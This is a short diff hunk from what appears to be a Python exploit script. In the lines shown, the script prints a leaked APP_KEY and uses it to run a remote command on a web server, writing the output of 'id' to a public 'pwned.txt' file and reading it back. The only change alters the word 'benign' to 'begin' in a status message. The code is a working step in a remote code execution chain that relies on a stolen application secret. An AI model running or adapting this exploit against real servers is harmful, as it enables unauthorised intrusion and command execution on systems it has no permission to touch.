@@ -813,7 +813,7 @@ def main() -> int:
     print(f"[+] leaked APP_KEY: {app_key}")
 
     status = run_command(sess, app_key, "id > /var/www/public/pwned.txt 2>&1")
-    print(f"[+] benign RCE test returned HTTP {status}")
+    print(f"[+] begin RCE test returned HTTP {status}")
     print(fetch_public("/pwned.txt").strip())
 
     status = run_command(
